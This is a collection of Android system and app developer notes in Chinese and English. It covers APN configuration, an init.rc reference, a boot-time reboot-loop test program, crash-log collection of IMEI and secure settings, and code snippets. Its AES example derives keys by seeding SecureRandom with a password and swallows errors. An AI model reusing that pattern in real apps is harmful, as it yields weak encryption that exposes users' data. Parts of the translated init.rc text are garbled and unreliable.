type   The valid values are "default", "mms", "supl"(used by GPS), "dun"(used by tethering, hotspot), "hipri", "fota", "ims", "cbs", "ia", "emergency", "dm", "wap", "net", "cmmail", "tethering"(phase out, don't use!), "rcse", "xcap", "rcs", "*". If not specified, it will be "*". * matches all. Normally we shouldn't use "*".
bearer_bitmask This field is used to specify under which bearers the APN can be used. E.g. to add support of WFC we need to modify it. (this field is replaced by network_type_bitmask after P0 Branch)
If configured as "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19", that means this apn can be used by mobile data and wifi both.
If configured as "18", it means this apn can only be used by wifi.
If configured as "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|19", it means all kinds of mobile data network bearer can use it except wifi.
If it's not configured, it is treated same as "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|19" described above. The only difference is that Settings App will not show the apn Bearer item if not configured.
On N1 and later, we should use "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19" to represent all bearers  instead of 1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18. Bit 19 means LTE_CA which is a new type added since N1. The number used by bearer_bitmask is defined in ServiceState.java, from RIL_RADIO_TECHNOLOGY_GPRS to RIL_RADIO_TECHNOLOGY_LTE_CA.
On P0 and later branches please use network_type_bitmask, the same config logic and value as bearer_bitmask. Android uses this to replace bearer_bitmask, the number used by network_type_bitmask is defined in TelephonyManager.java, from NETWORK_TYPE_GPRS to NETWORK_TYPE_LTE_CA.
user_visible the value can be "true" or "false", which is supported since M1. Default is true. If configed as false, the apn will be hidden, not shown in apn list of Settings.
user_editable the value can be "true" or "false", which is supported since O1. Default is true. If configed as false, the apn will be read only, shown in grey on UI.
mvno_type the value can be "imsi", "spn", "gid", "pnn".
mvno_match_data the value defined by OP.
For MORE items, please check Telephony Provider code about how it parses the apns-conf.xml. Generally the above information is enough.
How to modify the apns-conf.xml and update DB on mobilephone
adb pull system/etc/apns-conf.xml
modify...
adb push apns-conf.xml system/etc
delete telephony.db
N/O：adb shell rm -r data/user_de/0/com.android.providers.telephony/databases/telephony.db
Before N：adb shell rm -r data/data/com.android.providers.telephony/databases/telephony.db
adb reboot
O1 specific config file wifi-apns.xml
Note: This section is specially for O1 Branch, so please skip it if your project is not based on O1.

On O1 branch we have a specific file wifi-apns.xml for WiFi configurations.

If the APN is support:

Cellular only
Do not need to add bearer_bitmask field and no entry in wifi-apns.xml
Wifi only
Need add bearer_bitmask=18 in apns-conf.xml's apn entry
Cellular(All Rat) + WiFi
Do not add bearer_bitmask in apns-conf.xml. Add apn in wifi-apns.xml
IMPORTANT NOTE: all key fields (mcc, mnc, apn, mvno_type, mvno_match_data) in wifi-apns.xml should be exactly same as those in apns-conf.xml; in wifi-apns.xml you should add seprated item for each type if the APN has several types supported in apns-conf.xml (example3)

example1:
apns-conf.xml:
<apn carrier="IMS" mcc="202" mnc="01" apn="ims" type="ims" protocol="IPV4V6" roaming_protocol="IP"/>
wifi-apns.xml:
<apn mcc="201" mnc="01" apn="ims" type="ims"/>

example2: 
apns-conf.xml:
<apn carrier="IMS" mcc="525" mnc="05" apn="ims" type="ims" protocol="IPV4V6" roaming_protocol="IP" mvno_type="gid" mvno_match_data="0A"/>
wifi-apns.xml:
<apn mcc="525" mnc="05" apn="ims" type="ims" mvno_type="gid" mvno_match_data="0A"/>

example3: 
apns-conf.xml:
<apn carrier="HOS" mcc="260" mnc="02" apn="hos" mmsc="http://mms/servlets/mms" mmsproxy="213.158.194.226" mmsport="8080" type="mms,xcap" protocol="IPV4V6" roaming_protocol="IP"/>
wifi-apns.xml:
<apn mcc="260" mnc="02" apn="hos" type="mms"/> <apn mcc="260" mnc="02" apn="hos" type="xcap"/>

Cellular(Partial Rat) + WiFi
Specify the bearer_bitmask in apns-conf.xml,  ex: bearer_bitmask=1|14|18

APN数据保存在 /data/user_de/0/com.android.providers.telephony/databases/telephony.db 中
```

## [init] init.rc详解

```text
https://blog.csdn.net/morixinguan/article/details/50775266

本说明文件位于system/core/init/readme.txt
本文参考深入解析安卓系统一书，进行翻译，版权部分归书的作者  刘超，资深Android专家，系统架构师。
博客地址：http://blog.csdn.net/u013234805/article/details/45438219

Android Init Language
---------------------
The Android Init Language consists of four broadclasses of statements,
which are Actions, Commands, Services, and Options.
安卓的初始化脚本语言包括了4种基本的类型声明：行为，命令, 服务和选项。

All of these are line-oriented, consisting of tokensseparated by
whitespace.  Thec-style backslash escapes may be used to insert
whitespace into a token.  Double quotes may also be used to prevent
whitespace from breaking text into multipletokens.  The backslash,
when it is the last character on a line, may be usedfor line-folding.
所有的这些都以行为单位，各种符号则由空格分开。当然，C语言风格种的\反斜杠符号用在符号的期间插入相应的空格。双引号可以用于防止字符串被空格分割成多个记号。行的最后的反斜杠用于折行。
Lines which start with a # (leading whitespaceallowed) are comments.
注释的方法是以#号开头，当然也可以以空格开头。

Actions and Services implicitly declare a newsection.  All commands
or options belong to the section most recentlydeclared.  Commands
or options before the first section are ignored.

行为和服务声明一个新的分组。所有命令或者是选项都依赖于最近所声明的分组里。其中位于分组之前的命令或者是选项将会被忽略。

Actions and Services have unique names.  If a second Action or Service
is declared with the same name as an existing one, itis ignored as
an error.  (???should we override instead)

行为和服务有着独特的名字。如果第二行为或者服务宣告名字已经存在。那么这会导致行为或者服务被忽略或者产生相应的错误。（也许会被覆盖）

Actions  行为
-------
Actions are named sequences of commands.  Actions have a trigger which
is used to determine when the action shouldoccur.  When an event
occurs which matches an action's trigger, that actionis added to
the tail of a to-be-executed queue (unless it isalready on the
queue).
行为Actions其实就是一个序列的命令的集合。每个行为都有一个触发器trigger，触发器的作用决定了行为的什么时候将要执行。当一个符合Action触发条件的事件发生了，这个行为会加入到执行这个队列的结尾。

Each action in the queue is dequeued in sequence andeach command in
that action is executed in sequence.  Init handles other activities
(device creation/destruction, property setting,process restarting)
"between" the execution of the commands inactivities.

每一个行为都依次从队列里面被不断的取出来，然后这个行为的的每一个命令都将被一一执行。在这些命令执行的时候，init还同时处理着其它的活动，包括了设备节点的创建和销毁，设置属性，重新启动进程。

Actions take the form of:

Actions行为的格式如下：
on <trigger>
  <command>
  <command>
  <command>

Services 服务
--------
Services are programs which init launches and(optionally) restarts
when they exit. Services take the form of:
服务其实是一个后台的程序，这个程序在init进程中被启动，如果退出了可以由系统重新启动（可选择）。
服务的格式如下：
service <name> <pathname> [<argument> ] *
  <option>
  <option>
   ...

Options 选项
-------
Options are modifiers to services.  They affect how and when init runs the service.
选项是服务的一个修订项，他们决定了一个服务什么时候执行以及是如何去执行。

critical
   This is adevice-critical service. If it exits more than four times in
   four minutes,the device will reboot into recovery mode.
   Critical表示这是一个关键的服务。如果服务4分钟内重新启动超过4次的情况下，系统将会重新启动进入recovery模式。

disabled
   This servicewill not automatically start with its class.
   It must beexplicitly started by name.
   Disable表示服务不会通过trigger触发器启动，它必须是以命令“start service_name”的形式来进行启动。

setenv <name> <value>
   Set theenvironment variable <name> to <value> in the launched process.
    在服务启动的时候将环境变量name设置成value

socket <name> <type> <perm> [<user> [ <group> [ <context> ]  ]  ] 
   Create a unixdomain socket named /dev/socket/<name> and pass
   its fd to thelaunched process.  <type> must be"dgram", "stream" or "seqpacket".
   User andgroup default to 0.  用户和组默认为0
   Context isthe SELinux security context for the socket.
   It defaultsto the service security context, as specified by seclabel or computedbased on the service executable file security context.
    创建名为/dev /socket/<name> UNIX域套接字，并传递
    ???其文件描述符fd的推出进程。 <类型>必须是“DGRAM”，“流”或“SEQPACKET”。
    ???用户和组默认为0。
    ???Context是套接字SELinux的安全上下文。
    ???它默认到服务的安全上下文，如SECLABEL指定或
    ???基于服务的可执行文件的安全上下文来计算。

user <username>
   Change tousername before exec'ing this service.
   Currentlydefaults to root.  (??? probably shoulddefault to nobody)
   Currently, ifyour process requires linux capabilities then you cannot use
   this command.You must instead request the capabilities in-process while
   still root,and then drop to your desired uid.

在启动这个服务前设置服务的用户名，默认是root。如果你的进程没有相应的权限，你将不能使用这个命令。如果这个进程由root权限，可以在程序中设置到你想要的组uid。

group <groupname> [ <groupname> ] *
   Change togroupname before exec'ing this service. Additional
   groupnamesbeyond the (required) first one are used to set the
   supplementalgroups of the process (via setgroups()).
   Currentlydefaults to root.  (??? probably shoulddefault to nobody)

在启动这个服务前设置服务的组名。除了第一个组名，剩下的组名通常用于设置进程的附加组（通过setgroups()）。默认是root。

seclabel <securitycontext>
  Change tosecuritycontext before exec'ing this service.
  Primarily foruse by services run from the rootfs, e.g. ueventd, adbd.
  Services onthe system partition can instead use policy-defined transitions
  based on theirfile security context.
  If notspecified and no transition is defined in policy, defaults to the init context.

SECLABEL<SecurityContext的>更改为执行该服务之前SecurityContext中。主要为按服务使用从根文件系统，例如运行ueventd，adbd。在系统分区服务可以改用基于其文件的安全上下文策略定义的转换。如果不指定，不转变政策规定，默认为初始化上下文。

oneshot

   Do not restartthe service when it exits.服务在退出后不会再重新启动。

class <name>
   Specify aclass name for the service.  All servicesin a
   named classmay be started or stopped together.  Aservice
   is in theclass "default" if one is not specified via the
   class option.
给服务指定一个名字，所有的同名字的服务可以同时启动和停止。如果不通过class选项指定一个名字，则默认的名字是default

onrestart
    Execute aCommand (see below) when service restarts.
    当服务重启的时候，执行一条命令。

Triggers
--------
   Triggers arestrings which can be used to match certain kinds
   of events andused to cause an action to occur.
    触发器是一个用于匹配某种事件类型的字符串，它将使对于的行为执行。

boot
   This is thefirst trigger that will occur when init starts
   (after/init.conf is loaded)
    Boot是init执行后第一个触发的行为。在/init.conf被装载以后。

<name>=<value>
   Triggers ofthis form occur when the property <name> is set to thespecific value <value>.

这种形式的触发会在属性name设置为指定的值value时触发或者删除

device-added-<path>
device-removed-<path>
   Triggers ofthese forms occur when a device node is added or removed.
这种形式的触发器会在一个设备文件增加或者删除的时候触发。

service-exited-<name>
   Triggers ofthis form occur when the specified service exits.
这种形式的触发器会在一个指定的服务退出的时候触发。
 
Commands 命令
--------
exec <path> [ <argument> ] *
   Fork andexecute a program (<path>).  Thiswill block until
   the programcompletes execution.  It is best to avoidexec
   as unlike thebuiltin commands, it runs the risk of getting
   init"stuck". (??? maybe there should be a timeout?)
   Fork和启动第一个程序。在程序完成启动前，init将会阻塞。应该尽量避免使用exec，它可能会引起init卡死。

export <name> <value>
   Set theenvironment variable <name> equal to <value> in the
   globalenvironment (which will be inherited by all processes
   started afterthis command is executed)

设置全局变量<name>为<value>，所有在这个命令执行后运行的进程都将继承该环境变量。

ifup <interface>
   Bring thenetwork interface <interface> online.

启动网络接口interface

import <filename>
   Parse an initconfig file, extending the current configuration.

引入一个init的配置文件，拓展当前配置。

hostname <name>
   Set the hostname.

设置主机名。

chdir <directory>
   Changeworking directory.

改变进程当前的工作目录。

chmod <octal-mode> <path>
   Change fileaccess permissions.

设置文件或者目录的访问权限。

chown <owner> <group> <path>
   Change fileowner and group.

设置文件或目录的所有者和组。

chroot <directory>
  Change processroot directory.

设置进程的根目录。

class_start <serviceclass>
   Start allservices of the specified class if they are not alreadyrunning.

启动所有指定服务名称下的未运行服务。

class_stop <serviceclass>
   Stop allservices of the specified class if they are currently running.

停止所有指定服务名称下的已经运行的服务。

domainname <name>
   Set thedomain name.
设置域名。

enable <servicename>
   Turns adisabled service into an enabled one as if the service did not
   specifydisabled.
   If theservice is supposed to be running, it will be started now.
   Typicallyused when the bootloader sets a variable that indicates a specific
   serviceshould be started when needed. E.g.
     onproperty:ro.boot.myfancyhardware=1
        enablemy_fancy_service_for_my_fancy_hardware

启用<服务>如果服务没有指定禁用，则打开这个被禁用的服务。

如果服务是应该运行时，将立即开始。当引导加载程序设置一个变量，表示需要时一个特定的服务应启动通常使用。 例如：
  service shouldbe started when needed. E.g.
     onproperty:ro.boot.myfancyhardware=1

insmod <path>
   Install themodule at <path>

安装一个驱动模块

mkdir <path> [mode]  [owner]  [group] 
   Create adirectory at <path>, optionally with the given mode, owner, and
   group. If notprovided, the directory is created with permissions 755 and
   owned by theroot user and root group.

新建一个目录，可以指定访问权限、拥有者和组。如果没有被最后定，默认的访问权限是755，属于root用户和root组。

mount <type> <device> <dir> [<mountoption> ] *
Attempt tomount the named device at the directory <dir>
<device> may be of the form mtd@name to specify a mtd block
device byname.
<mountoption>s include "ro", "rw","remount", "noatime", ...
在指定的目录下挂载一个设备。可以是以mtd@name的格式指定的一个mtd块设备。
<mountoption>包括了 "ro","rw", "remount", "noatime", ...
 
restorecon <path> [ <path> ] *
    Restore thefile named by <path> to the security context specified
    in thefile_contexts configuration.
    Not requiredfor directories created by the init.rc as these are
    automaticallylabeled correctly by init.

重新存储指定的文件到一个由file_contexts配置的安全上下文。不用指定目录，它们会被init进程自动创建。

restorecon_recursive <path> [ <path> ] *
   Recursivelyrestore the directory tree named by <path> to the
   securitycontexts specified in the file_contexts configuration.
   Do NOT usethis with paths leading to shell-writable or app-writable
   directories,e.g. /data/local/tmp, /data/data or any prefix thereof.

递归的restorecon<路径> [<路径>]  *递归恢复通过<路径>命名的目录树中存储在file_contexts配置中指定的安全上下文。不要用路径，这会导致shell可写或应用可写目录，

例如使用/data/local/tmp, /data/data数据或任何其前缀。

setcon <securitycontext>
   Set thecurrent process security context to the specified string.
   This istypically only used from early-init to set the init context
   before anyother process is started.

设置当前进程的安全上下文为指定的串。主要用在early-init中去设置init的安全上下文。

setenforce 0|1
   Set theSELinux system-wide enforcing status.
   0 ispermissive (i.e. log but do not deny), 1 is enforcing.

设置SELinux系统级的enforcing状态。0代表permissive（如记录但是不拒绝服务），1代表enforcing

setkey
   TBD 目前没有使用

setprop <name> <value>
   Set systemproperty <name> to <value>.

设置系统属性<name>为<value>值。

setrlimit <resource> <cur> <max>
   Set therlimit for a resource.

设置系统属性<resource>的rlimit值。

setsebool <name> <value>
   Set SELinuxboolean <name> to <value>.
   <value>may be 1|true|on or 0|false|off

设置SELinux的boolean型属性"name"的值为"value"、"value"可以是1|true|on或者0|false|off

start <service>
   Start aservice running if it is not already running.

如果服务没有被执行就启动指定的服务

stop <service>
   Stop aservice from running if it is currently running.

如果服务在运行，那么就停止指定的服务。

symlink <target> <path>
   Create asymbolic link at <path> with the value <target>

创建一个符号链接。

sysclktz <mins_west_of_gmt>
   Set thesystem clock base (0 if system clock ticks in GMT)

设置系统时钟基准,0代表格林尼治平均时GMT为准。

trigger <event>
   Trigger anevent.  Used to queue an action fromanother
   Action.

触发一个事件。用于将一个行为和另一个行为连接在一起执行。

wait <path> [ <timeout> ] 
  Poll for theexistence of the given file and return when found,
  or the timeouthas been reached. If timeout is not specified it
  currentlydefaults to five seconds.

等待指定路径的文件创建出来，创建完成就停止等待，或者等待超时时间到。如果未指定超时时间，默认是5秒。

write <path> <string>
   Open the fileat <path> and write a string to it with write(2)
   withoutappending.

打开指定的文件，并写入一个或者多个字符串。

Properties 属性
----------
Init updates some system properties to provide someinsight into
what it's doing:
初始化更新一些系统属性来提供一些见解
它在做什么：

init.action
   Equal to thename of the action currently being executed or "" if none

等于当前正在执行或行动“的名义”，如果没有

init.command
   Equal to thecommand being executed or "" if none.

等于命令被执行或“”如果没有。

init.svc.<name>
   State of anamed service ("stopped", "running","restarting")

一个名为服务的状态（“停止”，“运行”，“重新启动”）

Example init.conf 例如init.conf
-----------------

# not complete -- just providing some examples ofusage
#
#不完整 - 只是提供一些用法示例
#

on boot
   export PATH/sbin:/system/sbin:/system/bin
   export LD_LIBRARY_PATH /system/lib
   mkdir /dev
   mkdir /proc
   mkdir /sys
   mount tmpfstmpfs /dev
   mkdir/dev/pts
   mkdir/dev/socket
   mount devptsdevpts /dev/pts
   mount procproc /proc
   mount sysfssysfs /sys
   write /proc/cpu/alignment4
   ifup lo
   hostnamelocalhost
   domainnamelocalhost
   mount yaffs2mtd@system /system
   mount yaffs2mtd@userdata /data
   import/system/etc/init.conf
   class_startdefault
service adbd /sbin/adbd
   user adb
   group adb
service usbd /system/bin/usbd -r
   user usbd
   group usbd
   socket usbd666
service zygote /system/bin/app_process -Xzygote/system/bin --zygote
   socket zygote666
service runtime /system/bin/runtime
   user system
   group system
on device-added-/dev/compass
   start akmd
on device-removed-/dev/compass
   stop akmd
service akmd /sbin/akmd
   disabled
   user akmd
   group akmd
Debugging notes 调试笔记
---------------
By default, programs executed by init will drop stdoutand stderr into
/dev/null. To help with debugging, you can executeyour program via the
Andoird program logwrapper. This will redirectstdout/stderr into the
Android logging system (accessed via logcat).

默认情况下，由init执行的程序将标准输出和标准错误信息输出定向到/dev/ null的。为帮助调试，您可以通过执行Android程序logwrapper。这将标准输出/标准错误重定向到Android的日志系统（通过logcat的访问）。

For example
service akmd /system/bin/logwrapper /sbin/akmd
例如
service akmd /system/bin/logwrapper /sbin/akmd
```

## 在android系统上写C语言程序--开机启动该程序不进入安卓系统

```text
今天要写的这篇博文意义重大，也是网上很少有的，这是在我工作中学会的一项技术，当然，它也是由简单的问题组合而来的。如何在安卓中写C语言程序，调试安卓驱动，测试程序的的一项重要技能，下面我就不说废话了，直接说实用的，怎么用这个东西。

关于这个问题，相信很多学Android的都会去关注这个问题,大家普遍会有个这样的疑问：安卓是怎么跑起来的?

最简单的说法，安卓系统是这样加载的：

Bootloader------Kernel(对应平台版本的Linux内核)------filesystem文件系统(这个就是Android了)

所以说，安卓其实不是操作系统，而是一个基于linux内核的文件系统。

那么，我们标题所说的，要在开机的时候就运行我们的程序而不选择进入安卓系统，那么如何来实现呢?首先，得了解一个问题，filesystem是怎么启动的。

从网上搜索的资料还有一些讲Andorid系统的书籍来看，文件系统的加载是从init.rc开始一步步的，创建文件系统所需的目录，还有给这些目录加权限，拷贝相关的程序，等待操作，最重要的，一个文件系统的运行需要加载这些服务才可以实现。至于怎么加载的，原理我就不多说了，说来话长，推荐大家可以去搜索init.rc，init.c这样的字眼就可以明白了。

我们现在讲的是如何来实现开机就执行bin文件，而不进入安卓系统。

1、  为了区别我的服务跟别的服务的不同，我的服务独立于一个on来进行触发。

on YYX
class_start core
service pppService /system/bin/PPPreboot 
   class core 
   user root
   group root
   oneshot
    我写的这个服务名字叫做pppService,服务对应需要执行的bin文件是PPPreboot，实现的就是平板一开机打印语句然后就重启，一直反复，这样就不会进入安卓文件系统了，也就看不到我们平常使用的安卓UI界面，而是黑压压的一篇，但是你在串口上可以看到调试信息输出，当然，如果你了解驱动应用编程，你可以在此时在屏幕上画点东西，做你自己的界面,其实就是写C或者C++的程序了，就是写linux的应用程序。

2、源码如下(位置:external/test/ppp.c)

#include <stdio.h>
#include <stdlib.h>
#include <android/log.h>
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, "keymatch", __VA_ARGS__)
int main(void)
{
 int i ;
    freopen("/dev/ttyMT0", "a", stdout);setbuf(stdout, NULL);
 freopen("/dev/ttyMT0", "a", stderr);setbuf(stderr, NULL);
 LOGD("YYX---->reboot system!!!!!!--->201612.1\n");
 system("reboot");
 return 0 ;
}
对应的Android.mk

LOCAL_PATH:=$(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE_TAGS := eng
LOCAL_LDLIBS := -llog
LOCAL_SRC_FILES:= \
     ppp.c
 
LOCAL_MODULE:= PPPreboot
include $(BUILD_EXECUTABLE)
#include $(BUILD_SHARED_LIBRARY)
1.对编写好的这个C程序进行编译，用命令mm或者mmm进行编译，编译生成的PPPreboot就位于我们开机启动的安卓文件系统的system/bin/这个目录下

2.在init.rc中调用trigger命令触发这个on YYX,只要再适当的位置加上:trigger  YYX  就可以了

3.编译:make -j8

将对应的文件下载到安卓平板，开机你就会发现平板可以打印信息也可以不断的重启了。

如果此时不加上:

freopen("/dev/ttyMT0","a", stdout);setbuf(stdout, NULL);

freopen("/dev/ttyMT0","a", stderr);setbuf(stderr, NULL);

你不会在安卓的串口上看到任何的输出信息，因为串口在init.cpp的时候就已经做了这步设置，详情请查看system/core/init/init.cpp代码:

open_devnull_stdio();

这一句的作用就是将安卓中的标准输入输出重定向到/dev/null，众所周知，这被称为是linux的一个空洞文件，这个文件可以接收一切的信息，它就像一个垃圾桶一样。但是有个特点，它是只进不出的。

所以，我们在自己写的C程序或者C++程序中需要先重定向到标准输入输出，freopen的作用就是这样的，还应该要注意，你的板子的串口输出设备节点是什么，我的是/dev/ttyMT0，有可能你的就跟我不一样了。

关于上面说的这个应用，应用范围，一些PCBA的产测工具可以在这个时候进行实现，或者手动OTA更新等等，应用非常广泛，需要大家在工作中孰能生巧。
```

## 通过自定义暗码启动

```text
<receiver
    android:name=".SecretCodeReceiver">
    <intent-filter>
        <action android:name="android.provider.Telephony.SECRET_CODE" />
        <data android:scheme="android_secret_code" android:host="1010"  />
    </intent-filter>
</receiver>

public class SecretCodeReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && SECRET_CODE_ACTION.equals(intent.getAction())){
            Intent i = new Intent(Intent.ACTION_MAIN);
            i.setClass(context, MainActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }
    }
}
```

## Android手机信息获取

```text
App信息获取
App安装列表获取
音量数据获取
版本数据获取
电池数据获取
Cpu实时数据获取
蓝牙数据获取
系统Build数据获取
摄像头数据获取
Cpu数据获取
调试数据获取
host数据获取
模拟器数据获取
hook数据获取
本地数据获取
内存数据获取
多开数据获取
网络数据获取
root数据获取
屏幕数据获取
SDCard数据获取
设置数据获取
信号数据获取
手机卡数据获取
堆栈数据获取
唯一ID数据获取
UA数据获取
Xposed数据获取
```

## [log] 日志记录

```text
timber + logger + LogUtils
```

## JSON 解析

```text
gson + jackson + fastjson + logansquare
```

## 数据库

```text
ActiveAndroid + ormlite + greenDAO + realm
```

## 网络

```text
android-async-http + okhttp + volley + retrofit
```

## [图片] 图片缓存

```text
BitmapFun + Picasso + Glide + Fresco + Android-Universal-Image+Loader
```

## 插件化

```text
dynamic-load-apk + DynamicApk + DroidPlugin + Small

https://blog.csdn.net/nupt123456789/article/details/50414175
```

## [log] Crash 日志收集

```text
UncaughtExceptionHandler
保存SharedPreference信息
保存Settings数据库信息

public String collectSecureSettings() {
    final StringBuilder result = new StringBuilder();
    final Field[]  keys = Settings.Secure.class.getFields();
    for (final Field key : keys) {
        if (!key.isAnnotationPresent(Deprecated.class) && key.getType() == String.class && isAuthorized(key)) {
            final Object value = Settings.Secure.getString(mContext.getContentResolver(), (String) key.get(null));
            if (value != null) {
                result.append(key.getName()).append("=").append(value).append("\n");
            }
        }
    }
    return result.toString();
}

通过 Runtime 执行 logcat 命令保存 logcat 信息
通过 Runtime 执行 dumpsys 命令保存 meminfo 信息
保存应用版本号
保存系统类型及版本号
保存手机设备型号
保存IMEI
保存渠道号
保存crash发生的时间
保存应用的包名
```

## 隐藏敏感信息

```text
隐藏在strings.xml中
隐藏在Java源码中
隐藏在BuildConfig中
使用DexGuard
对敏感信息进行伪装或加密
敏感信息隐藏在原声函数库中
对apk进行加固处理
```

## 本地拒绝服务

```text
将不需要给其他app调用的组件在AndroidManifest.xml中设置exported="false"
使用Intent获取extra数据时增加try{}catch
注意getAction() 为空的处理
使用intent获取数组，列表灯数据时要作长度验证
强制类型转换时要增加 try{}catch{}
```

## 使用 AES 加密

```text
public static byte[]  encrypt(String content, String password) {
    try {
        KeyGenerator kgen = KeyGenerator.getInstance("AES");
        kgen.init(128, new SecureRandom(password.getBytes()));
        SecretKey secretKey = kgen.generateKey();
        byte[]  enCodeFormat = secretKey.getEncoded();
        SecretKeySpec key = new SecretKeySpec(enCodeFormat, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        byte[]  byteContent = content.getBytes("utf-8");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[]  result = cipher.doFinal(byteContent);
        return result;
    } catch (Exception e) {
    }
    return null;
}
```

## Handler 静态内部类

```text
public class HandlerActivity extends Activity {
    private static class InnerHandler extends Handler {
        private final WeakReference<HandlerActivity> mActivity;
        public InnerHandler(HandlerActivity activity) {
            mActivity = new WeakReference<HandlerActivity>(activity);
        }
        public void handleMessage(Message msg) {
            HandlerActivity activity = mActivity.get();
            if (activity != null) {
                //
            }
        }
    }
    private final InnerHandler mHandler = new InnerHandler(this);
    private static final Runnable sRunnable = new Runnable() {
        public void run() {
        }
    };
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mHandler.postDelayed(sRunnable, 1000 * 60 * 5);
    }
}
```

## [Snippet] Context 的单例实现

```text
public class SingleInstance {
    private Context mContext;
    private static SingleInstance sInstance;
    private SingleInstance(Context context) {
        mContext = context;
    }
    private static SingleInstance getInstance(Context context) {
        if (sInstance == null) {
            sInstance = new SingleInstance(context.getApplicationContext());
        }
        return sInstance;
    }
}
```

## [工具] Android调试工具 Facebook Stetho

```text
dumpapp
```

## [开源] 安装使用 QARK(Quick Android review kit) 静态代码分析工具

```text
https://github.com/linkedin/qark
```

## [开源] external/svox/ 语音相关库

```text
http://cnmsdn.com/html/201010/1287296527ID8341.html
```

## [开源] external/neven 人脸识别库

## [开源] opencv

```text
简单的说这是基于图像动态捕捉处理、人脸识别、机器人视觉处理、图像信息认知录
入等多为一体计算机视觉库

下载ndk
http://bbs.weiphone.com/read-htm-tid-521406.html
2) 安装 ndk
$ tar xvjf OpenCV-2.1.0.tar.bz2
$ cd android-ndk-1.6_r1
$ export NDKROOT=`pwd`
$ ./build/host-setup.sh
3) 下载opencv
http://github.com/billmccord/OpenCV-Android/downloads
4) 编译 opencv
$ tar xvzf bill*
$ cd app
$ ln -s bill* opencv
$ make APP=opencv
5) 安装 opencv
$ adb push out/apps/opencv/libopencv.so /system/lib/
```

## 博客客户端的实现

```text
1. 原理介绍
1) XML-RPC 介绍
XML-RPC 的全称是 XML Remote Procedure Call,即 XML 远程方法调用。原理是XML-RCP 工具把传入的参数组合成 XML,然后用通过 http 协议发给服务器,服务器回复 XML 格式数据,再由工具解析给调用者。
2) Meta Weblog API
一些 Blog 提供 Meta Weblog API,用以支持通过 XML-RPC 的方法在软件中编辑及浏览 Blog。常用的 API 如下:发布新文章(metaWeblog.newPost)、获取分类(metaWeblog.getCategories)和最新文章(metaWeblog.getRecentPosts)、新建文章分类(wp.newCategory)、上传图片音频或视频(metaWeblog. newMediaObject)等。
2. Android的XML-RPC支持
Android本身并不支持XML-RPC协议,需要下载相关应的工具,本例中使用的XML-RPC从以下地址下载,完整例程中包含此部分
http://code.google.com/p/android-xmlrpc/downloads/list
3. 例程
package org.xmlrpc;
import java.net.URI;
import java.util.HashMap;
import java.util.Map;
import org.apache.http.conn.HttpHostConnectException;
import org.xmlrpc.android.XMLRPCClient;
import org.xmlrpc.android.XMLRPCException;
import org.xmlrpc.android.XMLRPCFault;
import org.xmlrpc.android.XMLRPCSerializable;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;
import android.widget.EditText;
import android.widget.Toast;
import android.widget.Button;
import android.content.DialogInterface.OnCancelListener;
import android.view.View.OnClickListener;
import android.view.View;
public class TestBlog extends Activity {
    private XMLRPCClient client;
    private URI uri;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.test_blog);
        Button btn = (Button) findViewById(R.id.send);
        btn.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                post();
            }
        });
    }
    void post() {
        String blogid = ((EditText) findViewById(R.id.blogid_edit)).getText().toString(); // 博客 ID, 有的博客支持一个用户多个 ID
        String username = ((EditText) findViewById(R.id.username_edit)).getText().toString();
        // 用户名
        String password = ((EditText) findViewById(R.id.password_edit)).getText().toString();
        // 密码
        String title = ((EditText) findViewById(R.id.title_edit)).getText().toString(); // 标题
        String content = ((EditText) findViewById(R.id.content_edit)).getText().toString(); // 正文
        uri = URI.create("http://blog.csdn.net/" + blogid + "/services/metablogapi.aspx");
        client = new XMLRPCClient(uri);
        Map<String, Object> structx = new HashMap<String, Object>();
        structx.put("title", title);
        structx.put("description", content);
        Object[]  params = new Object[]  { blogid, username, password, structx, true };
        try {
            client.callEx("metaWeblog.newPost", params);
            Toast.makeText(this, "OK", 10000).show();
        } catch (XMLRPCException e) {
            Toast.makeText(this, "ERROR" + e, 10000).show();
        }
    }
}
4. 多媒体上传的介绍
上传多图片视频音频方法如下
Map<String, Object> structx = new HashMap<String, Object>();
structx.put("name", "xxx.jpg"); // 文件名
structx.put("type", "image/jpeg"); // 格式
structx.put("bits", filebytes); // 文件内容 , 需要 base64 编码 , 可使用 android.util.Base64 来编码
structx.put("overwrite", true); // 是否覆盖
Object[]  params = new Object[]  { blogid, username, password, structx};
client.callEx("metaWeblog.newPost", params);
通过此方式可以实现相片视频的即片即转功能
5. 参考:
1) wordpress使用Meta weblog的接口如下
http://cn.wordpress.org/xmlrpc.php
2) 【PHP】XML-RPCで投稿!
http://blog.studio23c.com/?p=108
3) 完整例程下载
http://download.csdn.net/source/2793892
```

## [debug] 调试技巧

```text
3.5 调试技术
3.5.1
JDWP调试
1. JDWP 用于在 java 程序层面的调试
2. 在某一终端运行虚拟机
$ adb forward tcp:8000 tcp:8000
$ adb shell
$ dalvikvm -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=y -cp /sdcard/foo.jar
Foo
此时挂起等待调试
3. 在另一终端开启调试
$ jdb -attach localhost:8000
[jdb 提示符 ]  run
此时程序继续运行
4. jdb 常用命令
[jdb 提示符]  threads 看当前所有线程
[jdb 提示符]  trace methods 0x12aac5a00 跟踪线程号为 0x12aac5a00 的线程(线程号从
threads 得到)
[jdb 提示符]  next/step 下一步
[jdb 提示符]  40 next 执行 40 次 next
3.5.2
运行dalvik测试程序
1. 运行 dalvik 测试程序及 debug
2. 说明
一般在 android 平台上的程序都运行在应用框架之中,它也可以直接运行,以下介绍
最简单的运行和调试方法。
3. 运行 dalvik 自带的 test 程序
